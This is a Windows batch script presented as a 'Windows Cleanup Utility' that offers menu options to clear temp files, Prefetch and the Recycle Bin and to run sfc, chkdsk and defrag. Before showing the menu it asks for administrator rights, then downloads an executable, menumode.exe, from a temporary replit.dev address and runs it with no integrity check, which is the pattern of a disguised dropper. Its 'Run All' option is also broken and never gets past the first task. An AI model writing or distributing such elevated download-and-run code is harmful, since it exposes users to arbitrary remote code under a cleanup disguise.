@echo off
setlocal

openfiles >nul 2>&1
if '%errorlevel%' == '0' goto Admin

echo Solicite permissão de administrador para continuar...
powershell -Command "Start-Process '%~f0' -Verb RunAs"
if '%errorlevel%' NEQ '0' (
    echo A solicitacao de permissoes administrativas foi negada ou falhou.
    pause
    exit /b
)

:Admin
set "url=https://99e595d1-13c6-4e05-8507-d1e5c25fed8f-00-3tsqhihnomlbo.kirk.replit.dev/menumode.exe"

if not exist "%~dp0menumode.exe" (
    echo menumode.exe not found. Downloading...
    powershell -Command "Invoke-WebRequest -Uri %url% -OutFile '%~dp0menumode.exe'"
    if %ERRORLEVEL% neq 0 (
        echo Failed to download menumode.exe. Exiting...
        exit /b 1
    )
    echo Download complete.
)

color 0A
title Windows Cleanup Utility

:menu
cls
echo =====================================
echo       Windows Cleanup Utility
echo =====================================
rem Define the menu options
set "options[0]=Clean Temp folders"
set "options[1]=Clean Prefetch"
set "options[2]=Clean Recycle Bin"
set "options[3]=Optimize System"
set "options[4]=Repair System Files (SFC)"
set "options[5]=Check and Repair Disk Errors (CHKDSK)"
set "options[6]=Disk Cleanup"
set "options[7]=Defragment Disk"
set "options[8]=Run All"
set "options[9]=Exit"

rem Display the menu and capture user choice
menumode f870  "%options[0]%" "%options[1]%" "%options[2]%" "%options[3]%" "%options[4]%" "%options[5]%" "%options[6]%" "%options[7]%" "%options[8]%" "%options[9]%"

if %ERRORLEVEL% == 1 goto clean_temp
if %ERRORLEVEL% == 2 goto clean_prefetch
if %ERRORLEVEL% == 3 goto clean_recyclebin
if %ERRORLEVEL% == 4 goto optimize_system
if %ERRORLEVEL% == 5 goto repair_system_files
if %ERRORLEVEL% == 6 goto check_repair_disk
if %ERRORLEVEL% == 7 goto disk_cleanup
if %ERRORLEVEL% == 8 goto defrag_disk
if %ERRORLEVEL% == 9 goto run_all
if %ERRORLEVEL% == 0 goto leave
goto leave

:clean_temp
cls
echo Cleaning Temp folders...
del /q /f /s %temp%\*
pause
goto menu

:clean_prefetch
cls
echo Cleaning Prefetch...
del /q /f /s C:\Windows\Prefetch\*
pause
goto menu

:clean_recyclebin
cls
echo Cleaning Recycle Bin...
rd /s /q C:\$Recycle.Bin
pause
goto menu

:optimize_system
cls
echo Optimizing System...
:: Add optimization commands here
ipconfig /flushdns
pause
goto menu

:repair_system_files
cls
echo Repairing System Files...
sfc /scannow
pause
goto menu

:check_repair_disk
cls
echo Checking and Repairing Disk Errors...
chkdsk /f /r
pause
goto menu

:disk_cleanup
cls
echo Running Disk Cleanup...
cleanmgr /sageset:1
cleanmgr /sagerun:1
pause
goto menu

:defrag_disk
cls
echo Defragmenting Disk...
defrag C: /O
pause
goto menu

:run_all
cls
echo Running all tasks...
call :clean_temp
call :clean_prefetch
call :clean_recyclebin
call :optimize_system
call :repair_system_files
call :check_repair_disk
call :disk_cleanup
call :defrag_disk
pause
goto menu

:leave
cls
echo Leaving
exit
